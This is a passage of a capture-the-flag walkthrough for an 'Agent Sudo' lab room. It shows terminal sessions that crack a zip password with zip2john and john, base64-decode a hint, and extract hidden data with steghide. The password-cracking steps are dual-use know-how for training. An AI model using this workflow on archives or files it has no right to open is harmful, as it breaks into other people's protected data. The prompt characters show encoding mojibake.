<span style=color:#ae81ff>34562</span>         <span style=color:#ae81ff>0x8702</span>          Zip archive data<span style=color:#f92672>,</span> encrypted compressed size<span style=color:#f92672>:</span> <span style=color:#ae81ff>98</span><span style=color:#f92672>,</span> uncompressed size<span style=color:#f92672>:</span> <span style=color:#ae81ff>86</span><span style=color:#f92672>,</span> name<span style=color:#f92672>:</span> To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
<span style=color:#ae81ff>34820</span>         <span style=color:#ae81ff>0x8804</span>          End of Zip archive<span style=color:#f92672>,</span> footer length<span style=color:#f92672>:</span> <span style=color:#ae81ff>22</span>

                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ls <span style=color:#f92672>-</span>al  
total <span style=color:#ae81ff>80</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#f92672>.</span>
drwxrwxr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>35</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01 <span style=color:#ae81ff>33143</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01 <span style=color:#ae81ff>34842</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> _cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01   <span style=color:#ae81ff>217</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> cd _cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span> 
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ls <span style=color:#f92672>-</span>al 
total <span style=color:#ae81ff>315</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#f92672>.</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01 <span style=color:#ae81ff>279312</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#ae81ff>365</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>33973</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#ae81ff>365.</span>zlib
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01    <span style=color:#ae81ff>280</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>58</span> <span style=color:#ae81ff>8702.</span>zip
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01      <span style=color:#ae81ff>0</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> file <span style=color:#f92672>*</span> 
365:           data
<span style=color:#ae81ff>365.</span>zlib<span style=color:#f92672>:</span>      zlib compressed data
<span style=color:#ae81ff>8702.</span>zip<span style=color:#f92672>:</span>      Zip archive data<span style=color:#f92672>,</span> at least v5<span style=color:#f92672>.</span><span style=color:#a6e22e>1</span> to extract
To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#f92672>:</span> empty
</code></pre></div><p>Alright, let&rsquo;s try unzipping the file <strong>8702.zip</strong></p><p><img loading=lazy src=/images/thm-agent_sudo/Untitled%202.png alt></p><p>Trying to extract the files, there&rsquo;s a password on the .zip file. Let&rsquo;s try using <code>john</code> to crack it.</p><p>We can <code>zip2john</code> to convert it into a <code>crackable</code> format for <code>john</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> zip2john <span style=color:#ae81ff>8702.</span>zip  <span style=color:#f92672>&gt;</span> zip<span style=color:#f92672>.</span><span style=color:#a6e22e>hsah</span>
ver <span style=color:#ae81ff>81.9</span> <span style=color:#ae81ff>8702.</span>zip<span style=color:#f92672>/</span>To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> <span style=color:#66d9ef>is</span> not encrypted<span style=color:#f92672>,</span> or stored <span style=color:#66d9ef>with</span> non<span style=color:#f92672>-</span>handled compression type

<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> cat zip<span style=color:#f92672>.</span><span style=color:#a6e22e>hsah</span>           
<span style=color:#ae81ff>8702.</span>zip<span style=color:#f92672>/</span>To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#f92672>:</span>$zip2$<span style=color:#f92672>*</span><span style=color:#ae81ff>0</span><span style=color:#f92672>*</span><span style=color:#ae81ff>1</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4673</span>cae714579045<span style=color:#f92672>*</span><span style=color:#ae81ff>67</span>aa<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>e<span style=color:#f92672>*</span><span style=color:#ae81ff>61</span>c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0
b5e64e<span style=color:#f92672>*</span><span style=color:#ae81ff>4969</span>f382486cb6767ae6<span style=color:#f92672>*</span>$<span style=color:#f92672>/</span>zip2$<span style=color:#f92672>:</span>To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#f92672>:</span><span style=color:#ae81ff>8702.</span>zip<span style=color:#f92672>:</span><span style=color:#ae81ff>8702.</span>zip
</code></pre></div><p>Let&rsquo;s use <code>john</code> on it now!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> john zip<span style=color:#f92672>.</span><span style=color:#a6e22e>hsah</span> 
Using <span style=color:#66d9ef>default</span> input encoding<span style=color:#f92672>:</span> UTF<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>
Loaded <span style=color:#ae81ff>1</span> password <span style=color:#a6e22e>hash</span> <span style=color:#f92672>(</span>ZIP<span style=color:#f92672>,</span> WinZip <span style=color:#f92672>[</span>PBKDF2<span style=color:#f92672>-</span>SHA1 <span style=color:#ae81ff>256</span><span style=color:#f92672>/</span><span style=color:#ae81ff>256</span> AVX2 <span style=color:#ae81ff>8</span>x<span style=color:#f92672>])</span>
Will run <span style=color:#ae81ff>4</span> OpenMP threads
Proceeding <span style=color:#66d9ef>with</span> single<span style=color:#f92672>,</span> rules<span style=color:#f92672>:</span>Single
Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl<span style=color:#f92672>-</span>C to abort<span style=color:#f92672>,</span> almost any other key <span style=color:#66d9ef>for</span> status
Almost done<span style=color:#f92672>:</span> Processing the remaining buffered candidate passwords<span style=color:#f92672>,</span> <span style=color:#66d9ef>if</span> any<span style=color:#f92672>.</span>
Warning: Only <span style=color:#ae81ff>11</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt<span style=color:#f92672>,</span> minimum <span style=color:#ae81ff>32</span> needed <span style=color:#66d9ef>for</span> performance<span style=color:#f92672>.</span>
Proceeding <span style=color:#66d9ef>with</span> wordlist<span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>john<span style=color:#f92672>/</span>password<span style=color:#f92672>.</span><span style=color:#a6e22e>lst</span><span style=color:#f92672>,</span> rules<span style=color:#f92672>:</span>Wordlist
<span style=color:#a6e22e>alien</span>            <span style=color:#f92672>(</span><span style=color:#ae81ff>8702.</span>zip<span style=color:#f92672>/</span>To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#f92672>)</span>
<span style=color:#ae81ff>1</span>g <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span> DONE <span style=color:#ae81ff>2</span><span style=color:#f92672>/</span><span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span><span style=color:#f92672>)</span> <span style=color:#ae81ff>1.449</span>g<span style=color:#f92672>/</span>s <span style=color:#ae81ff>65284</span>p<span style=color:#f92672>/</span>s <span style=color:#ae81ff>65284</span>c<span style=color:#f92672>/</span>s <span style=color:#ae81ff>65284</span>C<span style=color:#f92672>/</span>s <span style=color:#ae81ff>123456.</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ferrises</span>
Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p>Awesome, let&rsquo;s use <strong>alien</strong> as password to <code>decrypt</code> and <code>extract</code> the <code>.zip</code> file. Got the contents of the file:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> cat To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
Agent C<span style=color:#f92672>,</span>

We need to send the picture to <span style=color:#960050;background-color:#1e0010>&#39;</span>QXJlYTUx<span style=color:#960050;background-color:#1e0010>&#39;</span> as soon as possible<span style=color:#f92672>!</span>

By<span style=color:#f92672>,</span>
Agent R
</code></pre></div><p>Alright, since we don&rsquo;t know the encoding type of <code>QXJlYTUx</code>, we can use <a href=https://github.com/Anon-Exploiter/decoder/>decoder</a> <em>(self-promotion hehe)</em> to find it.</p><p>Let&rsquo;s install and use it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> pip3 install decoder                                                                                                                                                                                     <span style=color:#ae81ff>130</span> <span style=color:#960050;background-color:#1e0010>â¨¯</span>
Collecting decoder         
  Downloading decoder<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span><span style=color:#f92672>.</span><span style=color:#a6e22e>tar</span><span style=color:#f92672>.</span><span style=color:#a6e22e>gz</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>5.2</span> kB<span style=color:#f92672>)</span>
Collecting pycipher
  Downloading pycipher<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>zip</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>45</span> kB<span style=color:#f92672>)</span>                                                                 
     <span style=color:#f92672>|</span><span style=color:#960050;background-color:#1e0010>â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><span style=color:#f92672>|</span> <span style=color:#ae81ff>45</span> kB <span style=color:#ae81ff>401</span> kB<span style=color:#f92672>/</span>s 
Requirement already satisfied<span style=color:#f92672>:</span> termcolor <span style=color:#66d9ef>in</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>python3<span style=color:#f92672>/</span>dist<span style=color:#f92672>-</span>packages <span style=color:#f92672>(</span>from decoder<span style=color:#f92672>)</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1.1</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span><span style=color:#f92672>)</span>
Building wheels <span style=color:#66d9ef>for</span> collected packages<span style=color:#f92672>:</span> decoder<span style=color:#f92672>,</span> pycipher
  Building wheel <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>decoder</span> <span style=color:#f92672>(</span>setup<span style=color:#f92672>.</span><span style=color:#a6e22e>py</span><span style=color:#f92672>)</span> <span style=color:#f92672>...</span> done
  Created wheel <span style=color:#66d9ef>for</span> decoder<span style=color:#f92672>:</span> filename<span style=color:#f92672>=</span>decoder<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span><span style=color:#f92672>-</span>py3<span style=color:#f92672>-</span>none<span style=color:#f92672>-</span>any<span style=color:#f92672>.</span><span style=color:#a6e22e>whl</span> size<span style=color:#f92672>=</span><span style=color:#ae81ff>5273</span> sha256<span style=color:#f92672>=</span><span style=color:#ae81ff>0264304102</span>d941c39dec2b4ee3c2bb0c6e0359e4d7c3f81199d2bbd4fbe93958
  Stored <span style=color:#66d9ef>in</span> directory<span style=color:#f92672>:</span> <span style=color:#f92672>/</span>root<span style=color:#f92672>/.</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>/</span>pip<span style=color:#f92672>/</span>wheels<span style=color:#f92672>/</span><span style=color:#ae81ff>45</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>d<span style=color:#f92672>/</span><span style=color:#ae81ff>2f</span><span style=color:#f92672>/</span>e717eed1e3663cf3c6db4ea1fbea0373c104bcba6d0504f393
  Building wheel <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>pycipher</span> <span style=color:#f92672>(</span>setup<span style=color:#f92672>.</span><span style=color:#a6e22e>py</span><span style=color:#f92672>)</span> <span style=color:#f92672>...</span> done
  Created wheel <span style=color:#66d9ef>for</span> pycipher<span style=color:#f92672>:</span> filename<span style=color:#f92672>=</span>pycipher<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>-</span>py3<span style=color:#f92672>-</span>none<span style=color:#f92672>-</span>any<span style=color:#f92672>.</span><span style=color:#a6e22e>whl</span> size<span style=color:#f92672>=</span><span style=color:#ae81ff>30458</span> sha256<span style=color:#f92672>=</span>af72bf4bbe7785b32183698ee3f5a655f22e1e53230104ca4a823594c83dec47
  Stored <span style=color:#66d9ef>in</span> directory<span style=color:#f92672>:</span> <span style=color:#f92672>/</span>root<span style=color:#f92672>/.</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>/</span>pip<span style=color:#f92672>/</span>wheels<span style=color:#f92672>/</span>ca<span style=color:#f92672>/</span>e7<span style=color:#f92672>/</span><span style=color:#ae81ff>37</span><span style=color:#f92672>/</span>bf758675337f9b98f096d8f7a5fd0cf320aadd67ae8a12f545
Successfully built decoder pycipher
Installing collected packages<span style=color:#f92672>:</span> pycipher<span style=color:#f92672>,</span> decoder
Successfully installed decoder<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span> pycipher<span style=color:#f92672>-</span><span style=color:#ae81ff>0.5</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span>
                                                    
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>/</span>_cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span><span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> decoder <span style=color:#f92672>-</span>s QXJlYTUx                                                                                  
________                          <span style=color:#f92672>.</span><span style=color:#a6e22e>___</span>            
<span style=color:#960050;background-color:#1e0010>\</span>______ <span style=color:#960050;background-color:#1e0010>\</span>   ____   ____  ____   __<span style=color:#f92672>|</span> _<span style=color:#f92672>/</span>___________                                                        
 <span style=color:#f92672>|</span>    <span style=color:#f92672>|</span>  <span style=color:#960050;background-color:#1e0010>\</span>_<span style=color:#f92672>/</span> __ <span style=color:#960050;background-color:#1e0010>\</span>_<span style=color:#f92672>/</span> ___<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>  _ <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#f92672>/</span> __ <span style=color:#f92672>|/</span> __ <span style=color:#960050;background-color:#1e0010>\</span>_  __ <span style=color:#960050;background-color:#1e0010>\</span>
 <span style=color:#f92672>|</span>    <span style=color:#960050;background-color:#1e0010>`</span>   <span style=color:#960050;background-color:#1e0010>\</span>  ___<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>\</span>  <span style=color:#960050;background-color:#1e0010>\</span>__<span style=color:#f92672>(</span>  <span style=color:#f92672>&lt;</span>_<span style=color:#f92672>&gt;</span> <span style=color:#f92672>)</span> <span style=color:#f92672>/</span>_<span style=color:#f92672>/</span> <span style=color:#960050;background-color:#1e0010>\</span>  ___<span style=color:#f92672>/|</span>  <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>                                                       
<span style=color:#f92672>/</span>_______  <span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>\</span>___  <span style=color:#f92672>&gt;</span><span style=color:#960050;background-color:#1e0010>\</span>___  <span style=color:#f92672>&gt;</span>____<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>\</span>____ <span style=color:#f92672>|</span><span style=color:#960050;background-color:#1e0010>\</span>___  <span style=color:#f92672>&gt;</span>__<span style=color:#f92672>|</span>   
        <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>     <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>     <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>           <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>    <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>/</span>       
                                                    
              Automate the Manual <span style=color:#f92672>:)</span>                
                                                                                                         
<span style=color:#f92672>---</span>                                                                                                      
<span style=color:#f92672>[</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#f92672>]</span> Provided <span style=color:#66d9ef>string</span><span style=color:#f92672>:</span> QXJlYTUx                                                                            
<span style=color:#f92672>---</span>                                                                                                      
                                                                                                         
<span style=color:#f92672>-------------------------------------------------------</span>
                                                                                                         
<span style=color:#f92672>[%]</span> Base <span style=color:#a6e22e>Encodings</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>85</span><span style=color:#f92672>)</span>
<span style=color:#f92672>[+]</span> Base64 decoded<span style=color:#f92672>:</span> Area51
<span style=color:#f92672>-------------------------------------------------------</span>       
                                                    
<span style=color:#f92672>[%]</span> Common Encodings                                                                                     
<span style=color:#f92672>[+]</span> AtBash decoded<span style=color:#f92672>:</span> JCQOBGFC
</code></pre></div><p>Alright, it was <strong>base64</strong> and it decodes to <strong>Area51</strong>. Let&rsquo;s try and use this password with <code>steghide</code> on the other <code>.png</code> file now.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> steghide extract <span style=color:#f92672>-</span>sf cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span> 
Enter passphrase<span style=color:#f92672>:</span> 
wrote extracted data to <span style=color:#e6db74>&#34;message.txt&#34;</span><span style=color:#f92672>.</span>
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ls <span style=color:#f92672>-</span>al 
total <span style=color:#ae81ff>84</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>08</span> <span style=color:#f92672>.</span>
drwxrwxr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>06</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01 <span style=color:#ae81ff>33143</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01 <span style=color:#ae81ff>34842</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
